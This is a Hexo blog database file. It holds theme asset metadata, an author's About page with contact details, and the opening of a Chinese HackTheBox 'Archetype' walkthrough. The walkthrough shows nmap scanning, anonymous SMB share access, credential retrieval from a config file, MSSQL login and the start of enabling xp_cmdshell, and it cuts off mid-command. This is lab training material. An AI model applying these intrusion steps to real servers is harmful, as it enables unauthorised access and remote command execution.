{"meta":{"version":1,"warehouse":"4.0.0"},"models":{"Asset":[{"_id":"source/CNAME","path":"CNAME","modified":1,"renderable":0},{"_id":"themes/3-hexo/source/css/gitalk.css","path":"css/gitalk.css","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/mobile.styl","path":"css/mobile.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/style.styl","path":"css/style.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/img/alipay.jpg","path":"img/alipay.jpg","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/img/article-list-background.jpeg","path":"img/article-list-background.jpeg","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/img/avatar.jpg","path":"img/avatar.jpg","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/img/brown-papersq.png","path":"img/brown-papersq.png","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/img/gov.png","path":"img/gov.png","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/img/school-book.png","path":"img/school-book.png","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/img/weixin.jpg","path":"img/weixin.jpg","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/js/gitalk.js","path":"js/gitalk.js","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/js/gitment.js","path":"js/gitment.js","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/js/iconfont.js","path":"js/iconfont.js","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/js/jquery.pjax.js","path":"js/jquery.pjax.js","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/js/script.js","path":"js/script.js","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/js/search.js","path":"js/search.js","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/js/titleTip.js","path":"js/titleTip.js","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/atom-dark.styl","path":"css/hl_theme/atom-dark.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/brown-paper.styl","path":"css/hl_theme/brown-paper.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/atom-light.styl","path":"css/hl_theme/atom-light.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/darcula.styl","path":"css/hl_theme/darcula.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/github-gist.styl","path":"css/hl_theme/github-gist.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/github.styl","path":"css/hl_theme/github.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/gruvbox-dark.styl","path":"css/hl_theme/gruvbox-dark.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/gruvbox-light.styl","path":"css/hl_theme/gruvbox-light.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/kimbie-light.styl","path":"css/hl_theme/kimbie-light.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/kimbie-dark.styl","path":"css/hl_theme/kimbie-dark.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/rainbow.styl","path":"css/hl_theme/rainbow.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/railscasts.styl","path":"css/hl_theme/railscasts.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/school-book.styl","path":"css/hl_theme/school-book.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/sublime.styl","path":"css/hl_theme/sublime.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/sunburst.styl","path":"css/hl_theme/sunburst.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/hl_theme/zenbum.styl","path":"css/hl_theme/zenbum.styl","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/fonts/icomoon.eot","path":"css/fonts/icomoon.eot","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/fonts/icomoon.svg","path":"css/fonts/icomoon.svg","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/fonts/icomoon.ttf","path":"css/fonts/icomoon.ttf","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/fonts/icomoon.woff","path":"css/fonts/icomoon.woff","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/fonts/iconfont.eot","path":"css/fonts/iconfont.eot","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/fonts/iconfont.ttf","path":"css/fonts/iconfont.ttf","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/fonts/iconfont.svg","path":"css/fonts/iconfont.svg","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/fonts/iconfont.woff","path":"css/fonts/iconfont.woff","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/fonts/selection.json","path":"css/fonts/selection.json","modified":1,"renderable":1},{"_id":"themes/3-hexo/source/css/fonts/iconfont.woff2","path":"css/fonts/iconfont.woff2","modified":1,"renderable":1}],"Cache":[{"_id":"source/CNAME","hash":"83804fe72bd82e0d745e13300bbfeee07031b519","modified":1634115651405},{"_id":"source/_posts/HackTheBox-Archetype.md","hash":"eb9220d9f6bc7bb9306e6826c2cf656172319c50","modified":1632907211934},{"_id":"source/_posts/HackTheBox-Oopsie.md","hash":"f31b16325e61005fd8994a7e1c045a5a6d6c6f0b","modified":1632907380243},{"_id":"source/_posts/HackTheBox-Shield.md","hash":"73dc1fdffb1021d237df824d8bd964c1d642cf0c","modified":1633008722514},{"_id":"source/about/index.md","hash":"301b439e6b8174178965295bf3781f701b73e2a4","modified":1632970046235},{"_id":"source/_posts/HackTheBox-Vaccine.md","hash":"66400fae162bc469f017521dfc7db69c25779800","modified":1632907661758},{"_id":"source/_posts/driftingblues2-VulnHub-Walkthrough.md","hash":"9f64c7f8f0843acbbec776581c65894594e7ff70","modified":1634027662156},{"_id":"source/_posts/driftingblues-VulnHub-Walkthrough.md","hash":"195fb1ce861827836994dc1c6d14a48075af4051","modified":1634027344751},{"_id":"themes/3-hexo/.DS_Store","hash":"0770f9d42bfdd8d420de48fed463015e001cf579","modified":1632902674868},{"_id":"themes/3-hexo/LICENSE","hash":"b04140c5f682db2b300428f97bb164fd7f5f18bd","modified":1632902674870},{"_id":"themes/3-hexo/README.md","hash":"19b8cfe6690c28427492f342e74dda5ed49a1664","modified":1632902674870},{"_id":"themes/3-hexo/_config.yml","hash":"9c458c10ef60a3378ecd2e79deca454ce94d5bb7","modified":1632906941922},{"_id":"themes/3-hexo/languages/en.yml","hash":"616e02c035c86033ab4a97c5ae9e0a9e5f0b8ea3","modified":1632902674872},{"_id":"themes/3-hexo/languages/zh-CN.yml","hash":"83633d45420c96dfac41333aeac3f3616dca5286","modified":1632902674872},{"_id":"themes/3-hexo/source/.DS_Store","hash":"fdcc907c46e093a14b153c5dc8c038461997ed3c","modified":1632902674884},{"_id":"themes/3-hexo/layout/index.ejs","hash":"1c185288c2925a652d577965626718e12df07f65","modified":1632902674883},{"_id":"themes/3-hexo/layout/post.ejs","hash":"a0eaba41e7ec9db5843af482470a45531049b457","modified":1632902674883},{"_id":"themes/3-hexo/layout/indexs.md","hash":"79ee15938241becde5c3b2643938a1bf381acc84","modified":1632970107457},{"_id":"themes/3-hexo/source/css/gitalk.css","hash":"3dc58e9a3fd63a3144d5fe850eb55e3dc885c9fb","modified":1632902674895},{"_id":"themes/3-hexo/source/css/mobile.styl","hash":"1c2f8b7d7cf46f219adb3a628bdf380f29ff4a6b","modified":1632902674904},{"_id":"themes/3-hexo/source/css/style.styl","hash":"29fa7f6619519c2dcfec4efac4314c5af659a92a","modified":1632902674904},{"_id":"themes/3-hexo/source/img/article-list-background.jpeg","hash":"4fdf8b3e53dd02d6ee6360aebfadb0cba1fb5633","modified":1632902674907},{"_id":"themes/3-hexo/source/img/brown-papersq.png","hash":"3a1332ede3a75a3d24f60b6ed69035b72da5e182","modified":1632902674908},{"_id":"themes/3-hexo/layout/_partial/article.ejs","hash":"9e5afcc26f47f93c165072b0a2b5cbf72efb7ef9","modified":1632902674873},{"_id":"themes/3-hexo/source/img/gov.png","hash":"f31c9f47faedf7f33b9580d6284ab891fb697560","modified":1632902674908},{"_id":"themes/3-hexo/source/img/school-book.png","hash":"711ec983c874e093bb89eb77afcbdf6741fa61ee","modified":1632902674908},{"_id":"themes/3-hexo/layout/_partial/article_copyright.ejs","hash":"9e1cdec49d5b9b44399348d96ecd7331f3ee7d85","modified":1632902674873},{"_id":"themes/3-hexo/layout/_partial/comment.ejs","hash":"d18f94e04ef0cf7abb432a8e707ccb3abc7fe435","modified":1632902674874},{"_id":"themes/3-hexo/layout/_partial/copyright.ejs","hash":"4c09f47e899fe36bfe36d92b12996219c2b5f622","modified":1632902674876},{"_id":"themes/3-hexo/layout/_partial/dashang.ejs","hash":"b2a01cc1f0326965f0a186ce3c9b3c991fd4e2c9","modified":1632902674877},{"_id":"themes/3-hexo/layout/_partial/footer.ejs","hash":"9087af9647a87c3fa9ef87632de5427ba4abe9c4","modified":1632902674878},{"_id":"themes/3-hexo/layout/_partial/friends.ejs","hash":"e6dd90be668195016d6e1c51a6baefb50676e6ab","modified":1632902674878},{"_id":"themes/3-hexo/layout/_partial/mathjax.ejs","hash":"e2be0e37f3d48e63e65a47d819bfb800b9aa3784","modified":1632902674880},{"_id":"themes/3-hexo/layout/_partial/full-toc.ejs","hash":"60a085fab3165ea1fc6370abac0bd6ab1b2f2510","modified":1632902674879},{"_id":"themes/3-hexo/layout/_partial/header.ejs","hash":"1e04b617fe38acca8b3d3774c5dbfcb74a02db6b","modified":1632902674879},{"_id":"themes/3-hexo/layout/_partial/meta.ejs","hash":"ab6329ddd908b0567c18f39ac6a8553c6fec67c5","modified":1632902674880},{"_id":"themes/3-hexo/layout/_partial/nav-left.ejs","hash":"f3cc395fbb4e308776a38e369faefbc9e5891807","modified":1632902674880},{"_id":"themes/3-hexo/layout/_partial/nav-right.ejs","hash":"7942c661b48e15fced4a97acf86fac7fea013378","modified":1632902674881},{"_id":"themes/3-hexo/layout/_partial/tag.ejs","hash":"8704e6bd833d270cc6a494d4e7cf1dfeddedba40","modified":1632902674881},{"_id":"themes/3-hexo/layout/_partial/toc-ref.ejs","hash":"33f7a4bfca1bb9835ec8f0d1e73188d1f56cc8b9","modified":1632902674882},{"_id":"themes/3-hexo/source/js/iconfont.js","hash":"3a0869ca1b09af07d82987e343a3bc4cb9558ecb","modified":1632902674918},{"_id":"themes/3-hexo/source/js/jquery.pjax.js","hash":"8c2a4f10a4da3d9615a3a81542494c6d21479b3d","modified":1632902674919},{"_id":"themes/3-hexo/source/js/script.js","hash":"36275888d57fecb6afd2c6f9291c46c2b3894ac5","modified":1632902674920},{"_id":"themes/3-hexo/source/js/search.js","hash":"788c610149a5f9361295f9f0207c8523f37ddb8b","modified":1632902674921},{"_id":"themes/3-hexo/source/js/titleTip.js","hash":"7299ac046ddd6e6a4267d435f7b4c8198baaaccc","modified":1632902674922},{"_id":"themes/3-hexo/source/css/_partial/comment.styl","hash":"d5fa333970a2eac66937d42eeb16fdb362e121ed","modified":1632902674885},{"_id":"themes/3-hexo/source/css/_partial/fade.styl","hash":"02c7510a26f306e240f23ddbf772a69be2c890dd","modified":1632902674885},{"_id":"themes/3-hexo/source/css/_partial/dashang.styl","hash":"f0eac1dc1f5dbed1769d032bb5fd5f002faaee26","modified":1632902674885},{"_id":"themes/3-hexo/source/css/_partial/font.styl","hash":"3db01e603985e6dbcacb6b0f13dbd804f5849e3c","modified":1632902674887},{"_id":"themes/3-hexo/source/css/_partial/full-toc.styl","hash":"9a732af065d0a80c9e420934be0f3582bf0129dc","modified":1632902674887},{"_id":"themes/3-hexo/source/css/_partial/nav-left.styl","hash":"0a067ced25025000aa33c8f5017c87fff0971378","modified":1632902674887},{"_id":"themes/3-hexo/source/css/_partial/nprogress.styl","hash":"2620a02169a6aeb75137fd368eac2c36423d8498","modified":1632902674888},{"_id":"themes/3-hexo/source/css/_partial/nav-right.styl","hash":"588b75e3b83ed95e526154bf3c0336c6f33e2be7","modified":1632902674888},{"_id":"themes/3-hexo/source/css/_partial/num-load.styl","hash":"f7ef35459ece22e1da950b86126be1c2bfe97fcf","modified":1632902674889},{"_id":"themes/3-hexo/source/css/_partial/post.styl","hash":"f1251e2a3b5334af3a22b51fc0293c2456568b50","modified":1632902674889},{"_id":"themes/3-hexo/source/css/hl_theme/atom-dark.styl","hash":"f3eb4e5feda9cbd6242ccf44ca064e2979b5d719","modified":1632902674895},{"_id":"themes/3-hexo/source/css/hl_theme/brown-paper.styl","hash":"03af387edcc1cf8c18d12e9c440fd51b6cf425b6","modified":1632902674896},{"_id":"themes/3-hexo/source/css/hl_theme/atom-light.styl","hash":"553987211d3323a7dfc0b08786b183a3435978c9","modified":1632902674896},{"_id":"themes/3-hexo/source/css/hl_theme/darcula.styl","hash":"2bfc14f27ccca108b4b3755782de8366e8bd001e","modified":1632902674896},{"_id":"themes/3-hexo/source/css/hl_theme/github-gist.styl","hash":"5e05b19832c1099bd9d284bc3ed00dc8a3d7ee23","modified":1632902674898},{"_id":"themes/3-hexo/source/css/hl_theme/github.styl","hash":"53276ff1f224f691dfe811e82c0af7f4476abf5d","modified":1632902674898},{"_id":"themes/3-hexo/source/css/hl_theme/gruvbox-dark.styl","hash":"315ad610d303caba9eac80a7d51002193a15478a","modified":1632902674898},{"_id":"themes/3-hexo/source/css/hl_theme/gruvbox-light.styl","hash":"1bece084b1dbbbd4af064f05feffd8c332b96a48","modified":1632902674899},{"_id":"themes/3-hexo/source/css/hl_theme/kimbie-light.styl","hash":"0c3ccd0d64e7504c7061d246dc32737f502f64e4","modified":1632902674900},{"_id":"themes/3-hexo/source/css/hl_theme/kimbie-dark.styl","hash":"e9c190f9ffc37a13cac430512e4e0c760205be4a","modified":1632902674900},{"_id":"themes/3-hexo/source/css/hl_theme/rainbow.styl","hash":"e5c37646a9d9c1094f9aab7a7c65a4b242e8db00","modified":1632902674901},{"_id":"themes/3-hexo/source/css/hl_theme/railscasts.styl","hash":"a6e8cfd2202afd7893f5268f3437421e35066e7b","modified":1632902674901},{"_id":"themes/3-hexo/source/css/hl_theme/school-book.styl","hash":"51659351b391a2be5c68728bb51b7ad467c5e0db","modified":1632902674902},{"_id":"themes/3-hexo/source/css/hl_theme/sublime.styl","hash":"501d75ef0f4385bea24d9b9b4cc434ba68d4be27","modified":1632902674902},{"_id":"themes/3-hexo/source/css/hl_theme/sunburst.styl","hash":"2aa9817e68fb2ed216781ea04b733039ebe18214","modified":1632902674903},{"_id":"themes/3-hexo/source/css/hl_theme/zenbum.styl","hash":"92941a6ae73b74f44ad7c559c5548c44073c644a","modified":1632902674904},{"_id":"themes/3-hexo/source/css/fonts/icomoon.eot","hash":"b6195bedc1cb2f9cfcb26cc27021f2e94be2ab0a","modified":1632902674890},{"_id":"themes/3-hexo/source/css/fonts/icomoon.svg","hash":"b5e7562c8494b0ddb3a70ecc5545ef7340d8e971","modified":1632902674890},{"_id":"themes/3-hexo/source/css/fonts/icomoon.ttf","hash":"eb976d8b8559fcddfc2658a03a4350cb566fc06b","modified":1632902674891},{"_id":"themes/3-hexo/source/css/fonts/icomoon.woff","hash":"3985d29416bb9b19f50a2f20f2bbbce47f10af8d","modified":1632902674891},{"_id":"themes/3-hexo/source/css/fonts/iconfont.eot","hash":"b14b8624988ff069aff3145f88c0d7ac49052bd3","modified":1632902674892},{"_id":"themes/3-hexo/source/css/fonts/iconfont.ttf","hash":"140829ecf12d30c6e18d8dc6dc0c188a66addd25","modified":1632902674893},{"_id":"themes/3-hexo/source/css/fonts/iconfont.svg","hash":"3630aabf2f9c0417f483ebd03d9e429dbc2594e0","modified":1632902674892},{"_id":"themes/3-hexo/source/css/fonts/iconfont.woff","hash":"0d2d4559f1ac4fa801eb8cc099fa5bf9dcf955ef","modified":1632902674893},{"_id":"themes/3-hexo/source/css/fonts/selection.json","hash":"b6456a4eabcffd95e822d1d7adce96da524d481a","modified":1632902674894},{"_id":"themes/3-hexo/source/css/fonts/iconfont.woff2","hash":"b0317a0b2ebb1181a8bf5a97d03556dd54538645","modified":1632902674894},{"_id":"themes/3-hexo/layout/_partial/comments/click2show.ejs","hash":"05b09c45b379ffeb4f48c1604044d88829f90799","modified":1632902674874},{"_id":"themes/3-hexo/layout/_partial/comments/disqus.ejs","hash":"32ce7b48d366b9c888ff2ceb911a3cd82f864537","modified":1632902674875},{"_id":"themes/3-hexo/layout/_partial/comments/gitalk.ejs","hash":"01567e010cf4f2dd141fe2019490d3f0d5aa2529","modified":1632902674875},{"_id":"themes/3-hexo/layout/_partial/comments/gitment.ejs","hash":"eaf2b6f297282606b630ad55fb9e38af7e2829dc","modified":1632902674875},{"_id":"themes/3-hexo/layout/_partial/comments/livere.ejs","hash":"2d115e79cadedc2d5d8f4b5618559640d986e01f","modified":1632902674876},{"_id":"themes/3-hexo/layout/_partial/comments/utteranc.ejs","hash":"8f2d4f42fbad351677c82e72420224587a5bd666","modified":1632902674876},{"_id":"themes/3-hexo/source/img/alipay.jpg","hash":"e574159d87c315e450ddc437af535113695af276","modified":1632908492000},{"_id":"themes/3-hexo/source/img/avatar.jpg","hash":"c1ef54453686c1828850d04804473787f3a3b0f6","modified":1632903892389},{"_id":"themes/3-hexo/source/img/weixin.jpg","hash":"cd0f16c76f5dd27231f923043c87c60f1e96d976","modified":1632908492000},{"_id":"themes/3-hexo/source/js/gitment.js","hash":"67984b83cd46ff4300d4fd959bf6c17dd66b4136","modified":1632902674918},{"_id":"themes/3-hexo/source/js/gitalk.js","hash":"3e2e0cf9caa6b8d07b9c5e0733a1ccb3e244259f","modified":1632902674916},{"_id":"public/about/index.html","hash":"990d7ed91ac55ac4eec3ce16abcc6e4abc705f7c","modified":1634115816090},{"_id":"public/2021/10/12/driftingblues2-VulnHub-Walkthrough/index.html","hash":"34d42b10f7f8be7b7254536e913cc9958c4b367f","modified":1634115816090},{"_id":"public/2021/10/12/driftingblues-VulnHub-Walkthrough/index.html","hash":"d32123aa78fb3c6c31102ed6900994668e9275df","modified":1634115816090},{"_id":"public/2021/08/18/HackTheBox-Shield/index.html","hash":"b237932a6f89cc4f97e64b1336ac5d99b01d1a61","modified":1634115816090},{"_id":"public/2021/08/02/HackTheBox-Oopsie/index.html","hash":"711e70df7b19dee1d751ccb591b18037c1d75f1c","modified":1634115816090},{"_id":"public/2021/07/13/HackTheBox-Archetype/index.html","hash":"41303429577925678f40dc32300ec5389057f51d","modified":1634115816090},{"_id":"public/2021/07/13/HackTheBox-Vaccine/index.html","hash":"4a2767ee6795d960382be76b6e2254e969a79662","modified":1634115816090},{"_id":"public/archives/index.html","hash":"d94e643109ab2abe38fabd9af76e655501d3389b","modified":1634115816090},{"_id":"public/archives/2021/index.html","hash":"d94e643109ab2abe38fabd9af76e655501d3389b","modified":1634115816090},{"_id":"public/archives/2021/07/index.html","hash":"d94e643109ab2abe38fabd9af76e655501d3389b","modified":1634115816090},{"_id":"public/archives/2021/08/index.html","hash":"d94e643109ab2abe38fabd9af76e655501d3389b","modified":1634115816090},{"_id":"public/archives/2021/10/index.html","hash":"d94e643109ab2abe38fabd9af76e655501d3389b","modified":1634115816090},{"_id":"public/categories/渗透测试/index.html","hash":"d94e643109ab2abe38fabd9af76e655501d3389b","modified":1634115816090},{"_id":"public/tags/HackTheBox/index.html","hash":"d94e643109ab2abe38fabd9af76e655501d3389b","modified":1634115816090},{"_id":"public/tags/VulnHub/index.html","hash":"d94e643109ab2abe38fabd9af76e655501d3389b","modified":1634115816090},{"_id":"public/index.html","hash":"d94e643109ab2abe38fabd9af76e655501d3389b","modified":1634115816090},{"_id":"public/CNAME","hash":"83804fe72bd82e0d745e13300bbfeee07031b519","modified":1634115816090},{"_id":"public/img/article-list-background.jpeg","hash":"4fdf8b3e53dd02d6ee6360aebfadb0cba1fb5633","modified":1634115816090},{"_id":"public/img/brown-papersq.png","hash":"3a1332ede3a75a3d24f60b6ed69035b72da5e182","modified":1634115816090},{"_id":"public/img/gov.png","hash":"f31c9f47faedf7f33b9580d6284ab891fb697560","modified":1634115816090},{"_id":"public/img/school-book.png","hash":"711ec983c874e093bb89eb77afcbdf6741fa61ee","modified":1634115816090},{"_id":"public/css/fonts/icomoon.eot","hash":"b6195bedc1cb2f9cfcb26cc27021f2e94be2ab0a","modified":1634115816090},{"_id":"public/css/fonts/icomoon.svg","hash":"b5e7562c8494b0ddb3a70ecc5545ef7340d8e971","modified":1634115816090},{"_id":"public/css/fonts/icomoon.woff","hash":"3985d29416bb9b19f50a2f20f2bbbce47f10af8d","modified":1634115816090},{"_id":"public/css/fonts/icomoon.ttf","hash":"eb976d8b8559fcddfc2658a03a4350cb566fc06b","modified":1634115816090},{"_id":"public/css/fonts/iconfont.ttf","hash":"140829ecf12d30c6e18d8dc6dc0c188a66addd25","modified":1634115816090},{"_id":"public/css/fonts/iconfont.eot","hash":"b14b8624988ff069aff3145f88c0d7ac49052bd3","modified":1634115816090},{"_id":"public/css/fonts/iconfont.svg","hash":"3630aabf2f9c0417f483ebd03d9e429dbc2594e0","modified":1634115816090},{"_id":"public/css/fonts/iconfont.woff","hash":"0d2d4559f1ac4fa801eb8cc099fa5bf9dcf955ef","modified":1634115816090},{"_id":"public/css/fonts/iconfont.woff2","hash":"b0317a0b2ebb1181a8bf5a97d03556dd54538645","modified":1634115816090},{"_id":"public/img/avatar.jpg","hash":"c1ef54453686c1828850d04804473787f3a3b0f6","modified":1634115816090},{"_id":"public/img/alipay.jpg","hash":"e574159d87c315e450ddc437af535113695af276","modified":1634115816090},{"_id":"public/img/weixin.jpg","hash":"cd0f16c76f5dd27231f923043c87c60f1e96d976","modified":1634115816090},{"_id":"public/css/mobile.css","hash":"5998f6fc27998596beb1e40e4bc3c43be2ed764c","modified":1634115816090},{"_id":"public/css/hl_theme/brown-paper.css","hash":"500c8e750373f6656ff49a7857c871ceedcf8777","modified":1634115816090},{"_id":"public/js/titleTip.js","hash":"81dca549063e29ba3a4a278f0f4388eba8a2167b","modified":1634115816090},{"_id":"public/css/hl_theme/atom-light.css","hash":"d31edb9816dae6b01410028bceb91757a962f780","modified":1634115816090},{"_id":"public/js/search.js","hash":"c80c9a231ee040c7adc07a477793873fb85ce8bc","modified":1634115816090},{"_id":"public/css/hl_theme/github-gist.css","hash":"7a41c1c479d09df875f99f1f6d94aac42e9e2ad0","modified":1634115816090},{"_id":"public/css/hl_theme/darcula.css","hash":"4341074bae4bc9f0b86e32b623e27babc0159b6e","modified":1634115816090},{"_id":"public/css/hl_theme/atom-dark.css","hash":"88d11052a24e8100af6248eb4dbe1ce7b0e96408","modified":1634115816090},{"_id":"public/css/hl_theme/gruvbox-dark.css","hash":"8c440d9b4ee19ac03eaee3c6af78ba52e5ba5535","modified":1634115816090},{"_id":"public/css/hl_theme/gruvbox-light.css","hash":"30514aaa242a34647aa666cfca4fc74c595ea8f2","modified":1634115816090},{"_id":"public/css/hl_theme/kimbie-dark.css","hash":"728527fcc308da454722c119b89e6da3025bd1e3","modified":1634115816090},{"_id":"public/css/hl_theme/kimbie-light.css","hash":"0c61926c989163faefb031d27bce3e287d6e10f2","modified":1634115816090},{"_id":"public/css/hl_theme/github.css","hash":"e05a0806a508a26b9f3f3794b6b588ec6504ad3f","modified":1634115816090},{"_id":"public/css/hl_theme/rainbow.css","hash":"7ff4251938076ddb7e4e49413db82653e5b61321","modified":1634115816090},{"_id":"public/css/hl_theme/school-book.css","hash":"ffbbcd13a74ac2404262c50b7a43053dfd0096ff","modified":1634115816090},{"_id":"public/css/hl_theme/railscasts.css","hash":"511f2fd2a84d426e5da5cb17880cc08f73beb002","modified":1634115816090},{"_id":"public/css/hl_theme/sublime.css","hash":"f65c5b116d9213afb9c324384a2f3bc86cb71121","modified":1634115816090},{"_id":"public/css/hl_theme/zenbum.css","hash":"0a78f74a93568e20b32ca7427c719e9bae9a0b55","modified":1634115816090},{"_id":"public/css/hl_theme/sunburst.css","hash":"8a135abac1512cf430d1d1ad2304b79afa1a4d6e","modified":1634115816090},{"_id":"public/css/style.css","hash":"db3b1cc156de2bd7563399cf74eeabf9abde50a7","modified":1634115816090},{"_id":"public/css/gitalk.css","hash":"58177ce227c50ee359fbf99a4fdd26058887afc5","modified":1634115816090},{"_id":"public/js/jquery.pjax.js","hash":"191c49fdb40dff115a49cfd2b30dffb888d86550","modified":1634115816090},{"_id":"public/css/fonts/selection.json","hash":"047b615ea32dc48dae5b964061427d41feaaafdf","modified":1634115816090},{"_id":"public/js/iconfont.js","hash":"3a0869ca1b09af07d82987e343a3bc4cb9558ecb","modified":1634115816090},{"_id":"public/js/script.js","hash":"d7efd27ade371c6e50d0d7481ffc0ec47018bad2","modified":1634115816090},{"_id":"public/js/gitment.js","hash":"59a1e03f2b0ce61dd9bd405d3c52d3e07cc10dec","modified":1634115816090},{"_id":"public/js/gitalk.js","hash":"26ba4841dcb4b178f730f53a8d1f4a7c89442b4f","modified":1634115816090}],"Category":[{"name":"渗透测试","_id":"ckupad5tr0003wsvt6nrybjgt"}],"Data":[],"Page":[{"title":"关于","date":"2021-09-30T02:47:26.235Z","_content":"\n### 个人简介\n\n*colind0pe*,\n\n网络空间安全专业本科在读，目前从事安全方面的实习工作\n\n### 联系我\n\n**WeChat**：hl_lhcq\n\n**邮箱**：1370227996@qq.com\n\n","source":"about/index.md","raw":"---\ntitle: 关于\ndate: 2021-09-29 16:58:38###\n---\n\n### 个人简介\n\n*colind0pe*,\n\n网络空间安全专业本科在读，目前从事安全方面的实习工作\n\n### 联系我\n\n**WeChat**：hl_lhcq\n\n**邮箱**：1370227996@qq.com\n\n","updated":"2021-09-30T02:47:26.235Z","path":"about/index.html","comments":1,"layout":"page","_id":"ckupad5tj0000wsvtdw21hghp","content":"<h3 id=\"个人简介\"><a href=\"#个人简介\" class=\"headerlink\" title=\"个人简介\"></a>个人简介</h3><p><em>colind0pe</em>,</p>\n<p>网络空间安全专业本科在读，目前从事安全方面的实习工作</p>\n<h3 id=\"联系我\"><a href=\"#联系我\" class=\"headerlink\" title=\"联系我\"></a>联系我</h3><p><strong>WeChat</strong>：hl_lhcq</p>\n<p><strong>邮箱</strong>：<a href=\"mailto:&#49;&#x33;&#55;&#48;&#x32;&#x32;&#55;&#x39;&#57;&#54;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;\">&#49;&#x33;&#55;&#48;&#x32;&#x32;&#55;&#x39;&#57;&#54;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"个人简介\"><a href=\"#个人简介\" class=\"headerlink\" title=\"个人简介\"></a>个人简介</h3><p><em>colind0pe</em>,</p>\n<p>网络空间安全专业本科在读，目前从事安全方面的实习工作</p>\n<h3 id=\"联系我\"><a href=\"#联系我\" class=\"headerlink\" title=\"联系我\"></a>联系我</h3><p><strong>WeChat</strong>：hl_lhcq</p>\n<p><strong>邮箱</strong>：<a href=\"mailto:&#49;&#x33;&#55;&#48;&#x32;&#x32;&#55;&#x39;&#57;&#54;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;\">&#49;&#x33;&#55;&#48;&#x32;&#x32;&#55;&#x39;&#57;&#54;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;</a></p>\n"}],"Post":[{"title":"HackTheBox-Archetype","date":"2021-07-13T09:05:21.000Z","_content":"\n## 实验环境\n\n![](https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png)\n\n## 实验过程\n\n### 信息收集\n\n#### nmap扫描：\n\n```\nnmap -sC -sV 10.10.10.27\n```\n\n-sC：使用默认脚本进行扫描，等同于–script=default\n-sV：探测开启的端口来获取服务、版本信息\n\n![](https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png)\n\n可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口\n\n#### 445端口匿名访问\n\n测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：\n\n```\nsmbclient -N -L //10.10.10.27/\n```\n\n-N：匿名登录\n-L：获取共享资源列表\n\n![](https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png)\n\n可以看到存在一个backups目录，使用smbclient来访问：\n\n```\nsmbclient -N //10.10.10.27/backups\n```\n\n![](https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png)\n\n发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：\n\n![](https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png)\n\n### impacket工具的使用\n\n> 下载地址：https://github.com/SecureAuthCorp/impacket/tree/master\n\n**安装**：\n\n进入impacket目录，执行：\n\n```\npip install .\n```\n\n![](https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png)\n\n用前面获得的账号和密码登录：\n\n```\nmssqlclient.py sql_svc@10.10.10.27 -windows-auth\n```\n\n![](https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png)\n\n判断当前是否拥有sysadmin权限：\n\n```\nSELECT IS_SRVROLEMEMBER('sysadmin')\n```\n\n![](https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png)\n\n返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行\n\n### 使用数据库调用系统命令\n\n依次写入：\n\n```\nEXEC sp_configure 'Show Advanced Options', 1;\t\t\t\\\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced 